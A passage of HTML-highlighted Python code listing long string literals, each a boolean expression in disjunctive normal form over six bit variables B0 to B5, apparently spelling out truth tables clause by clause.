B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 